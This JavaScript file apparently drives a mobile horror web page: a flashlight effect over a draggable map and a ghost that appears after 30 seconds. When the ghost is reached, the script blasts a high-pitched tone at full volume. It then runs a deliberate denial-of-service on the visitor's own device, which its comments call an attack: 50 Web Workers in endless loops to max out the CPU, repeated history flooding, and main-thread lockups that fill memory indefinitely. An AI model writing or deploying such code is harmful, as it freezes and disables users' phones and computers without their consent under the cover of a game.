let posX = -1000, posY = -1000;
let isLightOn = false;
let audioStarted = false;
let systemCrashed = false;
let isDragging = false;
let lastX = 0, lastY = 0;

let globalAudioCtx, globalOsc, globalGain;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// 1. 確保音效一定會響 (第一吓點擊觸發)
function initViolenceAudio() {
    if (audioStarted) return;
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    globalAudioCtx = new AudioContext();
    globalOsc = globalAudioCtx.createOscillator();
    globalGain = globalAudioCtx.createGain();
    
    globalOsc.type = 'sawtooth';
    globalOsc.frequency.value = 60; // 陰森低頻
    globalOsc.connect(globalGain);
    globalGain.connect(globalAudioCtx.destination);
    globalGain.gain.value = 0.05;
    
    globalOsc.start();
    if (globalAudioCtx.state === 'suspended') globalAudioCtx.resume();
    audioStarted = true;
}

function startExperience() {
    if (systemCrashed) return;
    if (intro) intro.style.display = 'none';
    
    initViolenceAudio();
    isLightOn = true;
    updateFlashlight(window.innerWidth / 2, window.innerHeight / 2);
    
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(()=>{});
}

function updateFlashlight(x, y) {
    if (isLightOn && !systemCrashed) {
        overlay.style.background = `radial-gradient(circle 130px at ${x}px ${y}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
    }
}

// 2. 全平台操控 (點擊即刻啟動音效，拖拽移動)
const enableInteraction = () => {
    startExperience();
    window.removeEventListener('touchstart', enableInteraction);
    window.removeEventListener('click', enableInteraction);
};
window.addEventListener('touchstart', enableInteraction, { once: true });
window.addEventListener('click', enableInteraction, { once: true });

window.addEventListener('touchstart', (e) => {
    if (systemCrashed) return;
    isDragging = true;
    lastX = e.touches[0].clientX; lastY = e.touches[0].clientY;
    updateFlashlight(lastX, lastY);
}, { passive: false });

window.addEventListener('touchmove', (e) => {
    if (systemCrashed || !isDragging) return;
    e.preventDefault();
    let tx = e.touches[0].clientX; let ty = e.touches[0].clientY;
    posX += (tx - lastX); posY += (ty - lastY);
    map.style.transform = `translate(${posX}px, ${posY}px)`;
    updateFlashlight(tx, ty);
    lastX = tx; lastY = ty;
}, { passive: false });
window.addEventListener('touchend', () => isDragging = false);

// 3. 真・暴力凍結 (Maximum Violence)
function triggerFinalCrash() {
    if (systemCrashed) return;
    systemCrashed = true;

    // A. 視覺瞬間切換
    document.body.innerHTML = `
        <div style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:99999; cursor:none;">
            <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red;">HELP ME.</h1>
        </div>
    `;

    // B. 音效瞬間撕裂 (最大音量，極高頻率)
    if (audioStarted && globalOsc && globalGain) {
        globalOsc.frequency.setValueAtTime(3500 + Math.random() * 1000, globalAudioCtx.currentTime);
        globalGain.gain.setValueAtTime(1.0, globalAudioCtx.currentTime);
    }

    // C. 0.3秒後發動「全系統癱瘓攻擊」
    setTimeout(() => {
        // 攻擊 1：Web Worker 病毒式自我複製 (瘋狂榨乾所有 CPU 核心)
        try {
            const blobCode = `while(true) { let a = new Array(100000).fill("DIE"); }`;
            const blobUrl = URL.createObjectURL(new Blob([blobCode], { type: 'application/javascript' }));
            // 一次過開 50 個 Worker，低階手機會瞬間黑畫面
            for (let i = 0; i < 50; i++) new Worker(blobUrl);
        } catch(e) {}

        // 攻擊 2：無盡死亡迴圈 (徹底鎖死主線程，令所有按鈕失效)
        const junkData = [];
        function deathSpiral() {
            // 塞爆 URL 歷史紀錄，癱瘓瀏覽器外殼 UI (例如 Safari 嘅網址列)
            for (let i = 0; i < 200; i++) {
                try { window.history.pushState(null, null, "#" + Math.random()); } catch(e){}
            }
            
            const start = Date.now();
            // 每次硬卡死 2 秒，唔俾 OS 任何處理其他操作嘅時間
            while (Date.now() - start < 2000) {
                // 產生巨量垃圾數據塞爆 RAM
                junkData.push(new Array(50000).fill(Math.random()));
            }
            
            // 0 毫秒延遲遞歸，唔俾任何喘息空間
            setTimeout(deathSpiral, 0);
        }

        deathSpiral();
    }, 300);
}

// 4. 測試用：30秒後自動撞鬼
setTimeout(() => {
    const glitch = document.createElement('div');
    glitch.style.cssText = `position:absolute; width:50px; height:50px; background:white; left:${-posX + window.innerWidth/2}px; top:${-posY + window.innerHeight/2}px; z-index:1001; box-shadow: 0 0 30px white;`;
    map.appendChild(glitch);
    
    const check = setInterval(() => {
        const r = glitch.getBoundingClientRect();
        const cx = window.innerWidth/2, cy = window.innerHeight/2;
        if (Math.abs(r.left + 25 - cx) < 60 && Math.abs(r.top + 25 - cy) < 60) {
            triggerFinalCrash();
            clearInterval(check);
        }
    }, 100);
}, 30000);
